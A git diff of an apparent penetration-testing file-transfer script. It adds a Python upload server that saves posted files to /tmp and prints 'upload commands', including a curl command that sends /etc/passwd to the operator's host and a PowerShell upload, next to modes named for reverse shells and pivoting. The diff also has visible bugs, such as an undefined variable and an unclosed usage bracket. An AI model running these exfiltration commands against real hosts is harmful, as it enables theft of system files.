@@ -22,11 +22,72 @@ DIR="/home/kali/Desktop/transfer"
 USER="user"
 PASSWORD="pass"
 
+UPLOAD_PORT=8059 # This needs to be referenced as below
+UPLOAD_SCRIPT="/tmp/upload_server.py"
+
+
+#=====
+# Python upload functionality
+#====
+cat << 'EOF' > "$UPLOAD_SCRIPT"
+#!/usr/bin/env python3
+import http.server, os, re
+from io import BytesIO
+
+class UploadHandler(http.server.BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_type = self.headers['Content-Type']
+        boundary = content_type.split("=")[1].encode()
+        remainbytes = int(self.headers['Content-Length'])
+
+        line = self.rfile.readline()
+        remainbytes -= len(line)
+
+        line = self.rfile.readline()
+        remainbytes -= len(line)
+
+        fn = re.findall(r'filename="(.*)"', line.decode())
+        if not fn:
+            self.send_response(400)
+            self.end_headers()
+            return
+
+        filename = os.path.basename(fn[0])
+        filepath = os.path.join('/tmp/', filename)
+
+        line = self.rfile.readline()
+        remainbytes -= len(line)
+        line = self.rfile.readline()
+        remainbytes -= len(line)
+
+        with open(filepath, 'wb') as out:
+            preline = self.rfile.readline()
+            remainbytes -= len(preline)
+
+            while remainbytes > 0:
+                line = self.rfile.readline()
+                remainbytes -= len(line)
+                if boundary in line:
+                    out.write(preline.rstrip(b'\r\n'))
+                    break
+                else:
+                    out.write(preline)
+                    preline = line
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"Upload success")
+
+http.server.HTTPServer(("0.0.0.0", 8059), UploadHandler).serve_forever()
+EOF
+
+chmod +x "$UPLOAD_SCRIPT"
+
 # =======================
 # Validate Arguments
 # =======================
-if [[ $# -lt 2 || $# -gt 3 ]]; then
-  echo -e "${RED}Usage:${RESET} $0 <host>:<windows|linux> <http|smb|both> [http_port]"
+if [[ $# -lt 3 || $# -gt 4 ]]; then
+  echo -e "${RED}Usage:${RESET} $0 <host>:<windows|linux> <http|smb|both> [http_port] [windows_pe|linux_pe|windows_ad|reverse_shells|pivot"
   echo "Use common ports for HTTP. e.g 80, 445"
   exit 1
 fi
@@ -69,6 +130,15 @@ print_tips() {
   printf "    - copy \\\\${IP}\\share\\file.exe .\n\n"
 
   printf "${GREEN}${RESET}\n"
+
+  echo -e "\n${BOLD}${CYAN}[UPLOAD COMMANDS]${RESET}"
+
+
+  CMD="curl -F "file=@/etc/passwd" http://${IP}:${UPLOAD_PORT}/"
+  echo -e "${CYAN}${CMD}${RESET}" | tee -a "$OUTPUT_FILE"
+  CMD="powershell -c \"Invoke-WebRequest -Uri http://${IP}:${UPLOAD_PORT}/ -Method POST -InFile file -ContentType 'multipart/form-data'\""
+  echo -e "${CYAN}${CMD}${RESET}" | tee -a "$OUTPUT_FILE"
+
 }
 
 TARGET_INPUT="$1"
@@ -128,6 +198,13 @@ printf "${CYAN}%s${RESET}\n" "--------------------------------------------------
 # =======================
 # Generate Commands
 # =======================
+
+##GLITCH THIS LINE PLS FIX
+file_folder="${4:-.}"
+cd "$file_folder"
+
+
+echo "Argument 4 is: $arg4"
 find . -type f | while read -r file; do
   REL_PATH="${file#./}"
   URL="http://${IP}:${PORT}/${REL_PATH}"
@@ -179,7 +256,7 @@ done
 
 
 # =======================
-# Copyq Helper
+# Copy Helper
 # =======================
 
 if [[ "$HOST_MODE" == "smb" || "$HOST_MODE" == "both" ]]; then
@@ -217,14 +294,23 @@ printf "${RED}Commands available in %s${RESET}\n" "$OUTPUT_FILE"
 
 print_tips
 
+
+echo -e "${CYAN}[+] Starting upload server on port ${UPLOAD_PORT}${RESET}"
+python3 "$UPLOAD_SCRIPT" &
+
+
 if [[ "$HOST_MODE" == "http" ]]; then
   echo -e "\n${GREEN}[+] Starting HTTP server on port ${PORT}${RESET}" | tee -a "$OUTPUT_FILE"
+  echo -e "${RED}"
   python3 -m http.server "$PORT" --bind 0.0.0.0 & 
 fi
 
 if [[ "$HOST_MODE" == "smb" ]]; then
   echo -e "${GREEN}[+] Starting SMB server${RESET}" | tee -a "$OUTPUT_FILE"
-  impacket-smbserver share "$DIR" -smb2support -username "$USER" -password "$PASSWORD" -debug &
+  echo -e "${RED}"
+  SERVE_DIR=$(realpath "$file_folder")
+  cd "$SERVE_DIR"
+  impacket-smbserver share "$SERVE_DIR" -smb2support -username "$USER" -password "$PASSWORD" -debug &
 fi
 wait
 
